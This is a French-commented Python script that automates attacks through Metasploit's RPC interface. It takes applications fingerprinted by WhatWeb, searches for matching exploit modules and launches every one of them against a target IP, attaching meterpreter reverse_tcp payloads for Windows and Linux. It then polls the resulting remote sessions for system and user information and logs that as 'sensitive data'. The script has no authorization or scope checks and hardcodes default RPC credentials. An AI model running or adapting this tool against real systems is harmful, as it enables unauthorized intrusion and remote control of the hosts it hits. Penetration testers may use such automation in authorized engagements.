from pymetasploit3.msfrpc import MsfRpcClient
import csv
import time
import sys
import os

def load_applications_from_csv(file):
    """Lecture des applications depuis le fichier CSV de WhatWeb."""
    apps = []
    with open(file, 'r') as csvfile:
        reader = csv.DictReader(csvfile)
        for row in reader:
            app = row.get('Application')
            if app and app != "Application non identifiée":
                apps.append(app)
    return apps

def search_exploits(client, search_term):
    """Recherche des modules exploit dans Metasploit."""
    results = client.modules.search(search_term)
    return results

def execute_exploit(client, module_type, module_name, payload, target_ip):
    """Exécution de l'exploitation."""
    module = client.modules.use(module_type, module_name)
    
    if 'RHOSTS' in module._moptions:
        module['RHOSTS'] = target_ip

    try:
        if payload and module_type == 'exploit':
            job = module.execute(payload=payload)
        else:
            job = module.execute()

        if job and 'job_id' in job:
            print(f"Module {module_name} exécuté avec succès, Job ID: {job['job_id']}")
            return True, job
        else:
            return True, None
    except Exception as e:
        print(f"Erreur lors de l'exécution du module {module_name}: {e}")
        return False, None

def get_active_sessions(client):
    """Fonction pour récupérer les sessions actives après exploitation."""
    sessions = client.sessions.list
    sensitive_data = []
    for session_id, session_info in sessions.items():
        try:
            sysinfo = client.sessions.session(session_id).run_with_output("sysinfo")
            user_info = client.sessions.session(session_id).run_with_output("whoami")
            sensitive_data.append(f"Session {session_id}: sysinfo={sysinfo.strip()}, user={user_info.strip()}")
        except Exception as e:
            sensitive_data.append(f"Session {session_id}: Erreur lors de la récupération des données - {e}")
    return sensitive_data

def save_results_to_csv(results, output_csv_file):
    """Enregistrer les résultats dans un fichier CSV."""
    with open(output_csv_file, 'w', newline='') as csvfile:
        fieldnames = ['Application', 'Module', 'Type', 'Résultat', 'Données sensibles', 'Mesures de sécurité']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for data in results:
            writer.writerow(data)
    print(f"Les résultats de l'exploitation ont été enregistrés dans {output_csv_file}")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 exploit_appli.py <target>")
        sys.exit(1)

    target = sys.argv[1]
    whatweb_csv_file = f"whatweb_results_{target}.csv"
    output_csv_file = f"metasploit_app_{target.replace('/', '_').replace(':', '_')}.csv"

    # Connexion au client RPC de Metasploit
    msf_username = 'msf'
    msf_password = 'msf'
    msf_server = '127.0.0.1'
    msf_port = 55553
    client = MsfRpcClient(msf_password, server=msf_server, port=msf_port, username=msf_username, ssl=False)

    applications = load_applications_from_csv(whatweb_csv_file)
    results = []

    for app in applications:
        print(f"Recherche d'exploits pour {app}")
        exploits = search_exploits(client, app)
        if exploits:
            for exploit in exploits:
                module_name = exploit['fullname']
                module_type = exploit['type']
                print(f"Exécution du module {module_name} ({module_type}) pour {app}")
                payload = None
                if 'windows' in module_name:
                    payload = 'windows/meterpreter/reverse_tcp'
                elif 'linux' in module_name:
                    payload = 'linux/x86/meterpreter/reverse_tcp'

                success, job = execute_exploit(client, module_type, module_name, payload, target)
                
                sensitive_data = []
                if success:
                    session_id = None
                    timeout = time.time() + 5  # 5 seconds timeout
                    while not session_id and time.time() < timeout:
                        sessions = client.sessions.list
                        if sessions:
                            session_id = list(sessions.keys())[0]
                        time.sleep(5)

                    if session_id:
                        session = client.sessions.session(session_id)
                        sensitive_data = get_active_sessions(client)
                        security_measures = "Aucune"
                    else:
                        print(f"Aucune session active n'a été détectée pour {module_name}")
                        security_measures = "Active"
                else:
                    security_measures = "MActive"

                results.append({
                    'Application': app,
                    'Module': module_name,
                    'Type': module_type,
                    'Résultat': 'réussi' if success else 'échoué',
                    'Données sensibles': "\n".join(sensitive_data) if sensitive_data else "Aucune",
                    'Mesures de sécurité': security_measures
                })
                print(f"Exploitation {'réussie' if success else 'échouée'} pour le module {module_name} ({module_type})")
        else:
            print(f"Aucun exploit trouvé pour {app}")
            results.append({
                'Application': app,
                'Module': 'Aucun',
                'Type': 'N/A',
                'Résultat': 'échoué',
                'Données sensibles': 'Aucune',
                'Mesures de sécurité': 'Active'
            })

    save_results_to_csv(results, output_csv_file)

if __name__ == '__main__':
    main()
